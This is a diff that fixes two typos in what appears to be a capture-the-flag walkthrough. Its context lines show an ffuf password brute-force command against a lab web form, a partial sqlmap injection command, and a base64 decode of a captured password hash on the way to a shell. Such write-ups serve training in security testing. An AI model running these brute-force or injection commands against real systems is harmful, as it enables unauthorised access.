@@ -96,7 +96,7 @@ and the page source has a comment :
 <!-- this form isn't connected to mysql, password ain't that complex --!>
 ```
 
-so we can some how brute force the password here, i used `ffuf` for doing this, but you can also use a custome python script or some other tools :
+so we can somehow brute force the password here, i used `ffuf` for doing this, but you can also use a custome python script or some other tools :
 
 ```text
 root@kali: ffuf -w /usr/share/wordlists/rockyou.txt  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "key=FUZZ" -u http://192.168.127.232/kzMb5nVYJw/index.php -fw 19
@@ -153,7 +153,7 @@ root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearc
 
 ## 3.Gaining Shell
 
-yes, we have `ramses` hashed password here, to find the actual password, first base64 decode the string (add a trailing `=` at the end) :
+Yes, we have `ramses` hashed password here, to find the actual password, first base64 decode the string (add a trailing `=` at the end) :
 
 ```text
 root@kali: echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE' | base64 -d
